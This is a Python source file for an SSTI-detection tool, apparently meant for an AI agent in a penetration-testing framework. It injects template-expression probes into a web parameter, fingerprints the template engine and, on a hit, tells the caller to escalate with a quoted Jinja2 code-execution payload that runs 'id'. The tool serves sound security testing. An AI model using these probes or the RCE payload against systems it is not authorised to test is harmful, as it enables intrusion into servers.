"""Server-side template injection — detect expression evaluation and fingerprint
the engine. When request data is rendered as a template, `{{73*79}}` comes back
as 5767; that arithmetic tell (with a control that proves it isn't a coincidence)
confirms SSTI, which is usually a path to RCE."""
from __future__ import annotations

from proofmark.tools._paraminject import base_value, set_param, send_timed
from proofmark.tools.base import Tool, ToolResult

_A, _B, _PROD = 73, 79, "5767"  # distinctive product, unlikely to appear by chance

# (payload, engine the delimiter points to)
_PROBES = [
    (f"{{{{{_A}*{_B}}}}}", "Jinja2 / Twig / Nunjucks"),   # {{73*79}}
    (f"${{{_A}*{_B}}}", "Freemarker / JSP-EL / Angular"), # ${73*79}
    (f"#{{{_A}*{_B}}}", "Velocity / Ruby (Slim)"),        # #{73*79}
    (f"<%= {_A}*{_B} %>", "ERB / JSP"),                   # <%= 73*79 %>
    (f"*{{{_A}*{_B}}}", "Smarty / Mako"),
]


class SstiTool(Tool):
    name = "ssti_test"
    description = (
        "Test one parameter for server-side template injection. Injects arithmetic template "
        "expressions ({{73*79}}, ${...}, #{...}, <%= %>) and confirms SSTI when the product 5767 "
        "comes back (with a control that rules out coincidence). Reports the likely template "
        "engine, which points to the RCE payload. Give the full url and the parameter."
    )
    parameters = {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "Full URL including the parameter's value."},
            "param": {"type": "string", "description": "Parameter to inject into."},
            "method": {"type": "string", "description": "HTTP method (default GET)."},
            "where": {"type": "string", "enum": ["query", "body"], "description": "query (default) or body."},
            "body": {"type": "string", "description": "Form body, required when where=body."},
        },
        "required": ["url", "param"],
    }
    returns_untrusted_data = True

    def __init__(self, client) -> None:
        self._client = client

    def run(self, url="", param="", method="GET", where="query", body=None, **_) -> ToolResult:
        method, where = (method or "GET").upper(), ("body" if where == "body" else "query")
        base = base_value(url, param, where, body)
        if base is None:
            return ToolResult(f"Parameter '{param}' was not found in the {where}.", is_error=True)

        # control: the literal digits must not already be in the response
        cu, cb = set_param(url, param, where, body, base + f"{_A}x{_B}")
        _s, control_body, _t = send_timed(self._client, method, cu, cb)
        if _PROD in control_body:
            return ToolResult(f"Inconclusive: {_PROD} already appears without evaluation — pick a "
                              "parameter whose value is reflected, or try a different one.")

        for payload, engine in _PROBES:
            u, b = set_param(url, param, where, body, base + payload)
            _s, rbody, _t = send_timed(self._client, method, u, b)
            if _PROD in rbody:
                return ToolResult(
                    f"SSTI CONFIRMED on '{param}' (high — often RCE). Payload {payload!r} evaluated "
                    f"to {_PROD}. Likely engine: {engine}. Escalate with an engine-specific payload "
                    "(e.g. Jinja2 `{{cycler.__init__.__globals__.os.popen('id').read()}}`) and use "
                    "oob_canary to prove code execution.")
        return ToolResult(f"No template injection detected on '{param}'. Arithmetic probes did not "
                          "evaluate.")
